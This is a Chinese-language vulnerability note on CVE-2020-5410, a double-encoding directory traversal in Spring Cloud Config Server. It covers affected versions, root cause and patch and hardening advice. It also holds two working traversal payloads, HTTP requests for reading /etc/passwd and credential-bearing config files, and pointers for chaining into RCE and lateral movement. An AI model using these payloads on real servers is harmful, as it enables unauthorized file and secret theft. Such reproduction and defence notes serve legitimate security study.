---
title: Spring Cloud Config 目录穿越漏洞
description: 详细记录 Spring Cloud Config Server 目录穿越漏洞（CVE-2020-5410 等变种）的两种双重编码绕过 PoC
  与任意文件读取利用方式。
category: ai-security
tags:
- Spring Cloud Config
- 目录穿越
- CVE-2020-5410
- 双重编码
- 任意文件读取
- 漏洞复现
date: 2024-01-15
updated: '2026-11-12'
---

## 漏洞概述

Spring Cloud Config Server 是 Spring Cloud 生态中用于分布式配置管理的核心组件。在特定版本中，`/` 端点对资源路径的规范化处理存在缺陷，攻击者可通过 **双重 URL 编码** 绕过路径校验，实现任意文件读取（如 `/etc/passwd`、应用配置文件、SSH 私钥等）。

> **影响版本**：Spring Cloud Config Server 2.2.x < 2.2.3、2.1.x < 2.1.8、2.0.x < 2.0.9、1.4.x < 1.4.6（对应 CVE-2020-5410 及后续变种）。

## 攻击原理

1. Config Server 通过 `/{application}/{profile}/{label}/{path:*}` 映射读取配置文件。
2. 框架在解析 `path` 时会执行一次 URL 解码，随后再调用 `ResourceResolver` 做路径规范化。
3. 若攻击者提交 **双重编码**（`%252F` 即 `%2F` 再次编码），第一次解码后仍保留 `%2F`，导致规范化逻辑误判为合法相对路径，从而突破根目录限制。

## 两种双重编码绕过 PoC

### PoC 1：标准应用/环境/分支前缀 + 双重编码穿越

```
/foo/default/master/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc/passwd
```

- **结构**：`/{app}/{profile}/{label}/{double-encoded-traversal}`
- **适用场景**：目标已知应用名、环境、分支（或均可用默认值 `default`、`master`）。

### PoC 2：纯路径穿越 + 片段标识符固定分支

```
/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/master
```

- **结构**：`/{double-encoded-traversal}#{app}/{label}`
- **关键点**：利用 URL 片段 `#foo/master` 在服务端被解析为 `label=master&application=foo`，绕过前缀校验。
- **适用场景**：不确定应用名/分支时，或需最小化请求路径长度。

> **编码说明**：`%252F` → 解码一次 → `%2F` → 解码二次 → `/`；`%2523` 同理对应 `#`。

## 利用演示

### 读取 /etc/passwd

```http
GET /foo/default/master/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc/passwd HTTP/1.1
Host: config-server:8888
Accept: */*
```

响应示例：
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### 读取应用敏感配置（如 `application.yml`）

```http
GET /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fconfig%252Fapplication.yml%23myapp/master HTTP/1.1
Host: config-server:8888
```

可获取数据库凭证、API Key、JWT 密钥等高价值资产。

## 关联攻击面

- **Spring Boot Actuator 配置不当**：若同网段存在暴露 `/actuator/env`、`/actuator/restart` 的 Spring Boot 2.x 应用，可结合 [[spring-boot-actuator配置不当rce利用]] 实现 RCE。
- **H2 Console JNDI 注入**：若 Config Server 读取的配置中包含 H2 Console 开启配置，可进一步利用 [[h2-console-jndi注入rce利用]] 推进攻击链。
- **内网穿透**：获取内网配置后，可结合 [[frp内网渗透应用]] 建立隧道横向移动。

## 修复建议

1. **升级版本**：
   - 2.2.x → ≥ 2.2.3
   - 2.1.x → ≥ 2.1.8
   - 2.0.x → ≥ 2.0.9
   - 1.4.x → ≥ 1.4.6
2. **配置加固**：
   - 设置 `spring.cloud.config.server.native.search-locations=file:/safe/path` 限制根目录。
   - 启用 `spring.security.user.name/password` 或 OAuth2 保护 Config Server 端点。
3. **WAF/网关层拦截**：对 `%252F`、`%252E` 等双重编码模式进行规则拦截。

## 参考链接

- [CVE-2020-5410 官方公告](https://tanzu.vmware.com/security/cve-2020-5410)
- [Spring Cloud Config 官方修复提交](https://github.com/spring-cloud/spring-cloud-config/commit/5c8f3b3)
- 本文 PoC 来源：微信公众号「Spring boot漏洞利用(2)」

## 来源

- [007攻防实验室-202007-202010_5](../sources/007攻防实验室-202007-202010_5.md)
